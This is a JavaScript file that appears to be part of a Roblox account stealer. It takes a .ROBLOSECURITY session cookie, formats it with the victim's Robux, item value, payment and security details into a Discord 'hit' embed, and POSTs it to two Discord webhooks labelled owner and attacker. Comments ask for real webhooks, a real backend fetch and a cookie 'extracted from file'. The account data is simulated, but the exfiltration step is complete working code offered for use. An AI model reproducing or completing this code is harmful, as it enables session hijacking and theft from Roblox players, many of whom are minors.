// Replace these with your real webhooks:
const OWNER_WEBHOOK = "https://discord.com/api/webhooks/OWNER_WEBHOOK_HERE";
const ATTACKER_WEBHOOK = "https://discord.com/api/webhooks/ATTACKER_WEBHOOK_HERE";

// Simulate Roblox account info fetching (replace with real backend fetch!)
async function simulateRobloxInfo(cookie) {
  // Simulated info (replace with server-side Roblox API queries)
  return {
    username: "Dramskof",
    userId: 12345678,
    avatar: "https://www.roblox.com/headshot-thumbnail/image?userId=12345678&width=150&height=150&format=png",
    accountCountry: "Serbia",
    accountAge: 1177,
    created: "2021-04-09T20:15:00Z",
    robux: 42,
    premium: true,
    twoStepEnabled: true,
    emailVerified: true,
    groupsOwned: 2,
    rap: 3972,
    summary: "Premium, active trader.",
    credit: 50,
    convert: 12,
    payments: 3,
    korblox: true,
    headless: false,
    playedMM2: true,
    mm2Gamepasses: "Elite, Radio",
    playedGrowAGarden: true,
    gagGamepasses: "VIP",
  };
}

// Main function: build and send hit embed
async function sendRobloxHitEmbed(cookie) {
  const info = await simulateRobloxInfo(cookie); // Replace with real backend fetch!

  const embed = {
    embeds: [{
      title: `${info.username} | Roblox`,
      description: [
        `\`\`\`\n.Cookie: ${cookie}\n\`\`\``,
        `**👤 Username:** ${info.username}`,
        `**🖼️ Avatar:** [View](https://www.roblox.com/users/${info.userId}/profile)`,
        `**🌍 Location:** ${info.accountCountry}`,
        `**📅 Account Age:** ${info.accountAge} days`,
        `**🆔 UserID:** ${info.userId}`,
        ``,
        `**💰 Robux:** ${info.robux}`,
        `**💼 Premium:** ${info.premium ? "Yes" : "No"}`,
        `**🔒 2-Step Enabled:** ${info.twoStepEnabled ? "Yes" : "No"}`,
        `**📧 Email Verified:** ${info.emailVerified ? "Yes" : "No"}`,
        ``,
        `**🧑‍🤝‍🧑 Groups Owned:** ${info.groupsOwned}`,
        `**🎁 RAP (Recent Average Price):** ${info.rap}`,
        `**🔎 Summary:** ${info.summary}`,
        `**💳 Credit:** ${info.credit}`,
        `**💱 Convert:** ${info.convert}`,
        `**💸 Payments:** ${info.payments}`,
        ``,
        `**🦴 Korblox:** ${info.korblox ? "Yes" : "No"}`,
        `**🎃 Headless:** ${info.headless ? "Yes" : "No"}`,
        ``,
        `**🎮 Games Played:**`,
        `MM2: ${info.playedMM2 ? "Yes" : "No"}${info.mm2Gamepasses ? ` | Gamepasses: ${info.mm2Gamepasses}` : ""}`,
        `Grow a Garden: ${info.playedGrowAGarden ? "Yes" : "No"}${info.gagGamepasses ? ` | Gamepasses: ${info.gagGamepasses}` : ""}`,
      ].join('\n'),
      thumbnail: { url: info.avatar },
      color: 15548997
    }]
  };

  // Send to both owner and attacker webhooks
  for (const webhook of [OWNER_WEBHOOK, ATTACKER_WEBHOOK]) {
    await fetch(webhook, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(embed)
    });
  }
}

// Usage example:
const roblosecurity = "YOUR_ROBLOSECURITY_COOKIE_HERE"; // Extract cookie from file!
sendRobloxHitEmbed(roblosecurity);